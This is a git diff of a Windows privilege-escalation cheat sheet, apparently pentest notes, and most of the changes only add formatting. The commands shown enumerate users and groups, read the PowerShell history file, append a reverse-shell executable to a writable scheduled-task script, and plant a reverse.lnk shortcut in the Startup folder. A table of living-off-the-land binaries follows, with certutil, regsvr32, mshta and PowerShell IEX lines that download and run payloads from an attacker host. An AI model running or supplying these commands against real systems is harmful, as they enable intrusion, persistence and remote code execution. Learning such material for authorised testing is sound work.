@@ -1,11 +1,17 @@
 ## Quick Enumeration
    
 whoami /all
+
 systeminfo
+
 net users
+
 net localgroup administrators
+
 ipconfig /all
+
 tasklist /svc
+
 
 winPEAS, privilege escalation
 
@@ -117,7 +123,7 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
 ```
 
 PowerShell History
-type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+`type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
 
 
 Windows password hunting privesc
@@ -129,23 +135,25 @@ Windows password hunting privesc
 7. Scheduled Tasks & Startup
    
 Scheduled Tasks
-schtasks /query /fo LIST /v
+
+`schtasks /query /fo LIST /v`
 
 If you can write to task script:
 
-echo C:\PrivEsc\reverse.exe >> C:\Tasks\Cleanup.ps1
+`echo C:\PrivEsc\reverse.exe >> C:\Tasks\Cleanup.ps1`
 
 Startup Folder
-icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+
+`icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"`
 
 Create shortcut:
-
+```powershell
 Set oWS = WScript.CreateObject("WScript.Shell")
 sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
 Set oLink = oWS.CreateShortcut(sLinkFile)
 oLink.TargetPath = "C:\PrivEsc\reverse.exe"
 oLink.Save
-
+```
 Run: cscript CreateShortcut.vbs
 
 
@@ -159,9 +167,14 @@ Windows startup folder privilege escalation site:reddit.com
 Living Off The Land Binaries – abuse trusted Windows tools:
 
 Binary	Command
+
 certutil	certutil -urlcache -split -f http://IP/nc.exe nc.exe
+
 regsvr32	regsvr32 /s /n /u /i:http://IP/rev.sct scrobj.dll
 mshta	mshta http://IP/rev.hta
+
 cscript	cscript //E:javascript \\IP\rev.js
+
 wmic	wmic process call create "cmd /c reverse.exe"
+
 powershell	powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://IP/rev.ps1')
